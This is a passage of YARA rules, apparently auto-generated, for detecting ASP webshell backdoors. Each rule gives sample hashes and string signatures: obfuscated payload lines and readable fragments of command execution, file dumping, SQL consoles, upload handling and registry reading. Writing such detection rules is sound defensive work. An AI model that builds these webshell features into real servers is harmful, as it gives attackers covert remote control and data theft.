        $s7 = "VWm[c#E@*@!zON@*@!JY.@*@!&0KDh@*@!zYC8^+@*J@#@&NJ@!DN@*@!l,m^C/k'C:,t.n6'BNC\\m/mMr2Y=?4WAsGs9+.`rEZ=-wKMWo.CsPok^nkJE*B@*`F*" fullword ascii
        $s8 = "xDAzq[cEYsB* /DXsncNkd2^lz'EUKxnEJrPtM+6xa[@*@!4@*" fullword ascii
        $s9 = "l7+dP'~rO92d3KAjj3\"JP'~74^D^W,[~rO&n'ZRZ !c!EPLP-81DV6~[,JOhG.YgW{J~[~OaW.Y,'P74^.^0P'~rPi/" fullword ascii
        $s10 = "Ok^PDk 3W6@#@&Y4+oG^NnD,xPd+WOvD/cEDtnnmO4JbBP&x?DD\"n\\vDd`rY4nhlY4E#BPJ'Eb#@#@&&0~?n.7+.R;.+mYn6(L+^OvZ61UP|sj}#csW^N" fullword ascii
        $s11 = "NP&WP@#@&sK.~3,',F~KG~d+U`kODbxb~ Pk~@#@&L~',%,e~8v,@#@&g+XOP@#@&.+kEsO,'PMn/!VY,Q~L,@#@&1n6O~@#@&4+XOWbxOnMP'~." fullword ascii
        $s12 = "mDkGx~d!0Owvb@#@&LE@!1+xOnM@*@!4M@*@!0GM:,xls+{v0KDhFEPhnDtW9xBaW/Dv~l1YbWU'vv@*@!Ol(s+,hr[Dt'vXZ!v@*@!OMPC^kTx'Em" fullword ascii
        $s13 = "@!JY9@*@!DN,rN{N@*@!bx2;DPxmh+{BYaCOtEPDX2+xvD+aYE~m^ldd{BKnaDAG6E~bNxEYalY4B,-l^En'EZlwE@*@!JON@*@!zD.@*@!DD,lskLU{B^+" fullword ascii
        $s14 = "xO T+YAs+s+xD$zq9`k# /Oz^+ Nbdw^lzx{JJEE*" fullword ascii
        $s15 = "#~@#@&9ksPrS,L~~VBP.+k;^Y~@#@&M+/!VD~',!~@#@&sG.,kP{~F,KW,Jnxv/DDrxb~@#@&(0,\\k9`dOMkxS~b~~F*~{PE6J,rD,Hb[`kY.k" fullword ascii
        $s16 = "lO+68N+^YvEHU(\\JyR(\\J_KPnrb@#@&ahWkY&cranx,JKrUKES,JtDOw=zz8+{RZRZRq)E',wGDD~[rzsnm\\+dEBPPD!n@#@&ahWkY&c?" fullword ascii
        $s17 = "@*lW;khmx.YE05y,=[Oss;4[#'O/GpT3eg#'.gH'|{XYVr,=|DkLS)\"bEKY\\ y6LXpYWWk3O.66)6LW.;3TnOD y(Y\"=|xD/Uy^~;@!" fullword ascii
        $s18 = "4dwp'x(/2ILx4d2p[U4k2p@!C,m^l/k'mhP4Dn0{B%C7l/1.kaY)U4GhwW^NnDcErZl-'KDKo.CsPsrs" fullword ascii
        $s19 = "56P\"64WW@!@*bb#=a||v0LW^sDjcDyX+Y(?{O6k;^P#=:|#'Y950,0YM.Gk{Y4x\"P\"a40G@!@*\"VTtx.TkyO[,NVoH@!@*zVS@!=#" fullword ascii
        $s20 = "XK+@*EYq!E'by.W-~My@!@*0\"@!@*Bqv{3Y.VThv]8fE'r.DK\\PD/S5y@!@*vy^o4v{Dob\"Y9PB9VLX(B{Y[;W~93LX@!@*mKD&@!" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _d5d37a02793361b3b9c8931d3d1a380e1bb10602_ec200b192c813e2ce5375000969b492afd827e2d_17
{
     meta:
        description = "asp - from files d5d37a02793361b3b9c8931d3d1a380e1bb10602.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6e8a05903143fc89b4d682d43866bfd9a7dc436009bcb7c75604cf6d3d4d7a4b"
        hash2 = "d6a0d99a37d8a49fc74095dc9352dcdbce15dd6cbe31d1c269b512e6b0058e82"
     strings:
        $s1 = "Jb/O@#@&kX/wk^nSb/OP{PEy_?CchN(^CUu V94fJ@#@&(W,?nD7nDcZ.nmY+68N+^Yv/}1j:{w?r*RwGV9+.2XkdOk`Y4nnmYt*~xPwl^/nPP4" fullword ascii
        $s2 = "[J@!z6GxD@*@!z6WUO@*@!z1nxD+D@*@!4D,mKVGDx:W * W+Pkk\"n{FP@*@!JY[@*@!&DD@*r)&0P}4:c!BFb'rP" fullword ascii
        $s3 = "fbD'rPL~YalOt,[~E'JPL~\\(mD^W~[,J SGorUt+dsbs+{J~',\\4^.^0~[,E frkl(V+{!r~[,\\8mMVW~LPJ ]+^nlD4d'8J,[~\\8^MVWPL~{@#@&ERg++[j" fullword ascii
        $s4 = "j_RI3!\"2)fv]mNhbxhlY4PL~nKDOP*@#@&(6Pqk)DMlXvKGDDbMDCXb~:tnx,@#@&NPKGMYP'E=J~@#@&%,tnXYKkxD+McZUY.`_+achWDD)DMlXvqb#*[;?ODcu" fullword ascii
        $s5 = "KCY4'rCF2emdr/bdmHzZu(g2-jeUK3H']zNhbx'\\ c!'j+M\\nD'nC.m:+DnDk-J@#@&KlMls+O+.xrnCDmh+D+.E@#@&nG.DPxPrKKDOr@#@&LJ@!4M@*" fullword ascii
        $s6 = "@!&DN@*@!ON,kN{[@*@!bxaEOPUCs+xBD2lDtv~DXwnxEYn6Dv,msm/k'B:+XOAK6vPbNxvDwlD4B,\\l^;n'EZ=-v@*@!&DN@*@!JOD@*@!O.,lVrL" fullword ascii
        $s7 = "@!&4@*@!zm@*@!&a@*@!&O9@*@!Y9~Sk[Dt{FPkYHs+{B8l13L.KEx9laW cy*+B@*@!DN@*@!rWMlh+,Uls+xvwkVnoMlh+E~kD^{BQbmDkKU'UtGh8srs" fullword ascii
        $s8 = "`UmDbwDKlDtb@#@&kW~6RbDODb4EDndP@!@*,&1PCU9Pd+kdkKxcE^WmVE*'EJ,O4+U@#@&6RbDYMr4!Yn/{FQ+3c_2+@#@&+x9~r0@#@&k+OPWx" fullword ascii
        $s9 = "N~q6~@#@&qW~tkNcdDDrxB~b~~8#,'Prmr~rMP\\k9`dOMkxB~kBPF*~xPrZrPPtnU,@#@&L,xP8 ~@#@&2x[~&0~@#@&(6P\\bNv/YMk" fullword ascii
        $s10 = "'DtnnCO4P-l^;+{JEE,[PuOsV3x1G9+cU+M\\+MRtCwhlOtvJ E*#PL~JrJPkr\"+{%Z@*@!kU2!Y~YH2+{tr[9+x~-mV;+{C9NPKH94P" fullword ascii
        $s11 = "r;O{OFE~LP-41.^0~LPrO2Xwb.+{!EPLP-81DV6~[,JO\"COkKja'qJ~',\\8mMs0,[~m@#@&JR]mYrWGGSxx8J,[P741.V6P'PrO]CDkWk/D" fullword ascii
        $s12 = "r[n0@#@&NP^96LJ@!mP4.+6'vgzmOrKx't\\fEPYm.L+D'EsrVnoMlh+E@*JLma[LJPj}dORO RUbEL+6@#@&NP1[6LJ@!l,t.n6'BQ)mDkW" fullword ascii
        $s13 = "'EE,YtnU,L~J,d1DG^V{xWr)N~J@*J@#@&Gkh~}4Kvq%B #=oU'zmDkGxl6(Kc!BT#,'~EUmDr2DkUocobVnUXkY+sr(%+1YE)}4PcZ~ *~',J" fullword ascii
        $s14 = "mYvJz9rGA ZKxUn1YkKUJ*@#@&1GUxUYMPxPEKMW-k9nD{Hr^MW/GWDRB+D }S3GAccRZiGCYmPjW!D^n{JPL~Y4+nmO4PLPriE@#@&^KxUR}2+" fullword ascii
        $s15 = "#iDGwctk9nWWM:csHlhnc\\CV!nP3'~EruukkrJQfgCs+I)+^/+,k6cszmOkKxxxrJHK-+wWV9n.Jr#PfHlhn,'~wMG:aYcEr" fullword ascii
        $s16 = "x8EDYKx~\\Cs!+xBGr/0P'~wkVndE@*@!zD[@*@!&DD@*@!YM@*@!ON,tnkTtOxW@*@!JON@*@!zD.@*@!DD@*@!ON~-mVro" fullword ascii
        $s17 = "D /M+lDnr(L+1OcZ}1UKmsj6*RoW^[+M2arkY/cdDD~[,O4+oKV9+D*P{~smVd+,K4n" fullword ascii
        $s18 = "NP(W,@#@&sK.,3~{P8PKKPdnxv/ODbxb~ Pk,@#@&NP',%~e,F+P@#@&HnXY~@#@&.+kEsO,'P.nkEsY,Q,L~@#@&g+6DP@#@&t" fullword ascii
        $s19 = "D-nM.l.rm4s+vE`IJr#BJzr#*@#@&~l^3`Dsxr@!4M@*@!(D@*@!^nxD+M@*@!l~4M+W'E%l7ld^MkwOl4kdYK.HR8mm0`#E@*" fullword ascii
        $s20 = "EJSoglh+*IYKw 4bN+WGM: sgCs+ 7l^E+,_{~Jruku-JEQG1lsni)+Vkn~k6`wb^YrG" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _3d7cd32d53abc7f39faed133e0a8f95a09932b64_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7_9c20d975e571892b9dd0acc47deffbea13351009__18
{
     meta:
        description = "asp - from files 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash3 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash4 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
        hash5 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
        hash6 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
     strings:
        $s1 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s2 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s3 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s4 = "execute(king(\"yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg " fullword ascii
        $s5 = "execute(king(\"ufoizgG = tsoXtiz ztU:yo rft:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'" fullword ascii
        $s6 = "execute(king(\"`>zhokel/<;'`&skx&)`tdqf_ktcktl`(zltxjtk&`//:hzzi'=fgozqegs.zftkqh>zhokel<` p" fullword ascii
        $s7 = ":openUrl=\"/\"&theUrl&\"\"\" target=\"\"_blank\":Else:openUrl=\"###\"\" onclick=\"\"alert('" fullword ascii
        $s8 = "execute(king(\"tszoJkzl = tszoJnTztu:)izqYktvgY,ltzxwokzzQ.tfBtiz(ltzxwokzzQztu & ` :" fullword ascii
        $s9 = "execute(king(\"trgetr=tktivnfQeY" fullword ascii
        $s10 = "execute(king(\"kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC" fullword ascii
        $s11 = "execute(king(\"`>ktzfte<>'19'=ziuoti rz<>kz<>ktzfte/<>q/<>zfgy/<>w/<)!" fullword ascii
        $s12 = "e&` ``tlsqy``=zltxjtNtzqrosqc ``zhokelR``=tuqxufqV tuqY @%`&)15(kie&``tzokK.))`bhlq.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly" fullword ascii
        $s13 = "ftiJ )`yoe.`&tdqfktcktl&`\\etzfqdnU\\qzqW fgozqeoshhQ\\lktlM ssQ\\lufozztU rfQ lzftdxegW\\`&ktcokrlnl(lzlobStsoX.gly yC" fullword ascii
        $s14 = ")`rkgvllqYzsxqytW\\fgugsfoK\\fgolktIzftkkxZ\\JG lvgrfoK\\zyglgkeoT\\SNQKJXBU\\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=rvllqY" fullword ascii
        $s15 = ")`tdqGktlMzsxqytW\\fgugsfoK\\fgolktIzftkkxZ\\JG lvgrfoK\\zyglgkeoT\\SNQKJXBU\\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=fodrQ" fullword ascii
        $s16 = ">afqsw_=ztukqz `&9llqh&`=tsoXgkY?`&VNM&`=ytki ``rsgw:ziuotv-zfgy;tfosktrfx:fgozqkgetr-zbtz``=tsnzl q<" fullword ascii
        $s17 = ")`tdqGktzxhdgZ\\tdqGktzxhdgZ\\tdqGktzxhdgZ\\sgkzfgZ\\ztUsgkzfgZzftkkxZ\\TSJUOU\\TVFD`(rqtNutN.ilv=tdqfktcktl" fullword ascii
        $s18 = "0tdqftsoy&`.`&bthrfk&`\\`&0izqhtsoy&`\\.\\\\`,izqhy tsoynhge.gly" fullword ascii
        $s19 = ">95XX95#=kgsge zfgy<` = ltzxwokzzQztu:tlst:`>``'`&izqYktvgY&`=izqYktvgY&0=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg " fullword ascii
        $s20 = "'(zktsq>'zhokelqcqp'=tuqxufqs zhokel<` p:4=ltzxwokzzQ.tsoXtiz:tlst:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _24934ab54fe9741096d218b306347ed49e39b613_45c5d358b1e2a8dfa7843efc4048bda3a062d990_9aac9927b8b768b3a33bb3b5ead77e69523ddb93__19
{
     meta:
        description = "asp - from files 24934ab54fe9741096d218b306347ed49e39b613.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
        hash2 = "23abe892536ce4bd71ccae771d7cc7c85fe0151248349d6d226c93086b87160b"
        hash3 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
        hash4 = "51d0c9158de018e29e78a232f9551c459773328e8845310a01df5d592289e3a7"
     strings:
        $s1 = "2rd=coxgCdawZH.))`\\`,bPX(2C5(c7xRc4Vx8.))c42xQ,`\\`,bPX(7tK(cExfjc7xR.wtr KcTo )2rd(coxg4a wKJ ``><2rd dX" fullword ascii
        $s2 = "`;)'`&Vo4&`'(oVc2x`=Vo4 KcTo ``><Vo4 dX:)Z7V,Vo4(wYC KZXoEKPd:KZXoEKPQ wKp:)x7x(oEcrymcoxcVE.VcSVc4=cTL ocj:)x7x(cTL KZXoEKPQ" fullword ascii
        $s3 = "`>';%WWD:oTtXcT;ZoPx:C-bZ2dVcSZ'=c2Co4 SXw<>'`&)W(2E&`:VZ2ZE-wKPZVtLExy;W:VcwVZy'=c2Co4 'VcoKcE'=KtX2x 'YfWWA'=TowXb wo<`r" fullword ascii
        $s4 = ">';)(c4Z2E.bZwKXb:ofXVE4xSxr'=LEX2EKZ #=dcVT x<>Vy<>Vy<>c7xVdX/<>'WWq'=oTtXcT 'WWO'=TowXb ''=EV4 'Z'=c7xK c7xVdX<`,`E`5rP" fullword ascii
        $s5 = ")`1RaGij_IGpB9`(4YZ&`?`&7x7&`/`&)c42xQ,`/`,)`mQRa_siJ8`(4YZ(7tK&)`iGm8_Gp3Gpj`(4YZ&`:`&)`pHJR_Gp3Gpj`(4YZ&`//:fooT`=Vyo" fullword ascii
        $s6 = "))``,`?]'``[? =? ocjVxTE`,)W()c42xQ,`+]-b\\[?]'``[? =? ocjVxTE`,)(4Vcwxcsc4KZf4cG22Joct.cL7(YxX(cEx2fcGtcV(7XVi=44Y" fullword ascii
        $s7 = ")` >oKZd/<;zkD#&>O=cNX4 4tKXwycb=cExd oKZd<`,` >oKZd/<W>q=cNX4 4tKXwtKXb=cExd oKZd<`,`W`=o(dXX=cf5:)o(cf5 KZXoEKPd" fullword ascii
        $s8 = "``(7VXdKZE KVPocV:ofXVE4xSxr'=LEX2EKZ '7x'=44x2E`,`)```&)XrZ(YC2&```,```&7VE&```(4xo:ofXVE4xSxr`(fTY=XyX" fullword ascii
        $s9 = "))``,`?]'``[? =? ocjVxTE`,)W()c42xQ,`+]-b\\[?]'``[? =? ocjVxTE`,oYcic4KZf4cG.cL7(YxX(cEx2fcGtcV(7XVi=44Y" fullword ascii
        $s10 = ")`+`,`kA|KZooPy`,`q=+4bZV.`&Cr4&`:^`(XVd&)`-`,`kA|KZooPy`,`q=-4bZV.`&Cr4&`)q>4bZV.`&Cr4&`(dX:^`(XVd=4tZ" fullword ascii
        $s11 = "`(cbw&`>')D-(Zt.CVZo4XT:ofXVE4xSxr'=dcVT x<>X2<>X2/<` & cEVPZj.VVp & ` :" fullword ascii
        $s12 = ")wcXdXwZ7o4x2coxw.2,)wcXdXwZ7o4x2coxw.2(cbw,W=))(bZK,wcXdXwZ7o4x2coxw.2,`w`(ddXwcoxw(dXX,WeD 5rP" fullword ascii
        $s13 = ")wcXdXwZ7o4x2coxw.d,)wcXdXwZ7o4x2coxw.d(cbw,W=))(bZK,wcXdXwZ7o4x2coxw.d,`w`(ddXwcoxw(dXX,WeD 5rP" fullword ascii
        $s14 = "`\\`&)`yt4`(KZX44c4=)`yt4`(KZX44c4 KcTo `\\`><)D,)`yt4`(KZX44c4(oTtXV wKx ``><)`yt4`(KZX44c4 dX" fullword ascii
        $s15 = "wcXdXwZ7o4x2coxw.)bPX(c2Xdoct.dNZ=PVL KcTo )bPX(4o4XYcc2Xd.dNZ dX" fullword ascii
        $s16 = "`|tXdKZE|27Y|27oT|7oT|4r|XKX|EKX|oYo|fTf|f4r|4E|YE4x|Yx4x|Yf4x|YwE|VcE|x4x|f4x|`=yX4 o4KZn" fullword ascii
        $s17 = "cNXj.Cyr,`TotKcl-oKcoKZn` VcwxcswwJ.c4KZf4cG" fullword ascii
        $s18 = "`Srx|fSC|TPw|ybE|745|x45|KZx|75E|Vxf|PEw|oPY|oTo|ytb|LdE|dEP|dKY|b42|44r|yKb|yt4|rcZ`=5b7 o4KZn" fullword ascii
        $s19 = "rw4:``,``,`dEP`LrK:``,``,`7xVxf`LrK:`P4o`,``,`Txw`LrK:`TXX`,``,`rcZ`LrK:`oKcVxf_`,YN5,`yw`LK5" fullword ascii
        $s20 = "cKXlbcRyS & `>ofXVE4/<` & 5dx & `>``ofXVE4xSxr/oYco``=cfCo ofXVE4<` & cKXlbcRyS r" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _a6ab3695e46cd65610edb3c7780495d03a72c43d_c8b2efc1fd9cb438052bf0f5236748e0456b49b8_20
{
     meta:
        description = "asp - from files a6ab3695e46cd65610edb3c7780495d03a72c43d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "53346253fef1d655c844c914a6535fed1d82b98b45ceb27ff39e37a54f55a49a"
        hash2 = "29487c5ba2f6f32848cfaad36301c1034b533e3a7904197878146bd6936a5c55"
     strings:
        $x1 = "HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)" fullword ascii
        $x2 = "bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)" fullword ascii
        $s3 = "GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type" fullword ascii
        $s4 = "Content_Disposition = LTrim(SeparateField(Head, \"content-disposition:\", \";\"))" fullword ascii
        $s5 = "<b>User</b>: <%= \"\\\\\" & oScriptNet.ComputerName & \" \\ \" & oScriptNet.UserName %> <br>" fullword ascii
        $s6 = "Content_Type = LTrim(SeparateField(Head, \"content-type:\", \";\"))" fullword ascii
        $s7 = "Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type)" fullword ascii
        $s8 = "<b>HTTPD</b>: <%=request.servervariables(\"SERVER_SOFTWARE\")%> <b>Port</b>: <%=request.servervariables(\"SERVER_PORT\")%> <br>" fullword ascii
        $s9 = "PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf))" fullword ascii
        $s10 = "response.write(\"File: \" & FilePath & \" Format: \" & tempmsg & \" has been saved.\")" fullword ascii
        $s11 = "<b>User Agent</b>: <%=request.servervariables(\"HTTP_USER_AGENT\")%> <br>" fullword ascii
        $s12 = "alue=DeleteFolder><br><input type=submit name=cmdOption Value=CopyFolder> to <input type=text name=CopyFolderTo></td></tr>\")" fullword ascii
        $s13 = "TwoCharsAfterEndBoundary = BinaryToString(MidB(Binary, PosCloseBoundary + LenB(Boundary), 2))" fullword ascii
        $s14 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute3\"))" fullword ascii
        $s15 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute2\"))" fullword ascii
        $s16 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute8\"))" fullword ascii
        $s17 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute4\"))" fullword ascii
        $s18 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute7\"))" fullword ascii
        $s19 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute6\"))" fullword ascii
        $s20 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute5\"))" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4f6b24f29d976007db17bd51c7cd0dd3ffa31e48_576c275d0cd96d4911ebe5ca197f85343672bf76_68040c9830d03127e21fb9aac7050fe6a70157d5__21
{
     meta:
        description = "asp - from files 4f6b24f29d976007db17bd51c7cd0dd3ffa31e48.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b8957d9ce9e559b134eb2c82121b276bf4d987a99d167e2d3484d4b925437f0b"
        hash2 = "abcee820fd8a8ab161d1739f14b70084a4cb689e3f32d3d712f0bf027c4e0ad7"
        hash3 = "38f63e43d98de7d5005af23ef48ade06eccf59392ebd481cf39c4b99d53977ee"
        hash4 = "49b8ad91bbf545ff3b17ce7bd15007c82dbdb76930f3f03a7d3ee919b1cb9e1d"
        hash5 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
        hash6 = "ea3606fa2294d6fbd348ae8666a0cda14a4d1157be9f9adaf34bec21094515e8"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $s2 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s3 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s4 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s5 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s6 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s8 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s9 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s10 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s11 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s12 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s13 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s14 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s15 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s16 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s17 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s18 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
        $s19 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword ascii
        $s20 = "Call Response.AddHeader( \"Content-Disposition\", \"attachment; filename=\" & Request.Form(\"Fname\") )" fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x2023 ) and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _081a73a1b23769a55b9107e518f85f476e902309_115b3ee52583fdbabeeb9814038f7bc25fb8e3bd_143df8e735a7a776468700150dc64008f7944e01__22
{
     meta:
        description = "asp - from files 081a73a1b23769a55b9107e518f85f476e902309.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
        hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
        hash3 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
        hash4 = "c83ae2f8b285bfd9f0aa4d40508b758cfae713e251234c9c18cf1d143d5e8764"
        hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
        hash6 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
        hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
        hash8 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
        hash9 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
        hash10 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
        hash11 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
        hash12 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
        hash13 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
        hash14 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
     strings:
        $s1 = "RRS\"<tr><td height='20'><a href='?Action=downloads' target='FileFrame'>" fullword ascii
        $s2 = "'>alue=it' v'submtype=nput '> <iCmd&~~&Deflue='%' vath:92='widStylecmd' ame='put n&~<inSI=SI>~`~ The~)<>~(~cmd.FormquestIf Ren`s" ascii
        $s3 = "\"\");FullDbStr(0);return false;}return true;}\":RRS\"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = " ascii
        $s4 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\">\"" fullword ascii
        $s5 = "r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En\",Pos):End Function:End Class:sub getTerminalInfo():ExeCute SinfoEn(\" Nex" ascii
        $s6 = "~ th)=~yeript~(~wsc.Formquestif Reen`Sot(1ject(ateObM=CreSet C,0))`~&Def~ /c Path&Shellexec(D=CM.Set DCmd)`eadalout.rD.stdaaa=Dl" ascii
        $s7 = "RRS ~>~`Else`rKey)inUsetoLog & aunPathoLogid(autegReawsX.Rme = sernaoginUautoL`~<br>me & sernaoginUautoL ~ & " fullword ascii
        $s8 = "& ~ ePathrr(thshowE`End If`(thePolder.GetFect~)emObjeSystg.Filiptin(~ScrbjecteateOer.Cr Servder =heFolSet tath)`r.FilFolde= thei" ascii
        $s9 = "- tmp(i Len(p(i),ht(tm= RigendN  )` ThenendN)eric(Isnum and artN)ic(stnumerIf Is`To enartN  = stFor jdN`xxx,jrt & ipStaScan(Cal" fullword ascii
        $s10 = "RRS\"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>" fullword ascii
        $s11 = "RRS \"<option value='HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SchedulingAgent\\LogPath'>Schedule Log</option>\"" fullword ascii
        $s12 = "RRS\"<option value=\"\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Linkage\\Bind\"\">" fullword ascii
        $s13 = "set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1" fullword ascii
        $s14 = "RRS\"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>" fullword ascii
        $s15 = "RRS\"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>" fullword ascii
        $s16 = "RRS\"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>" fullword ascii
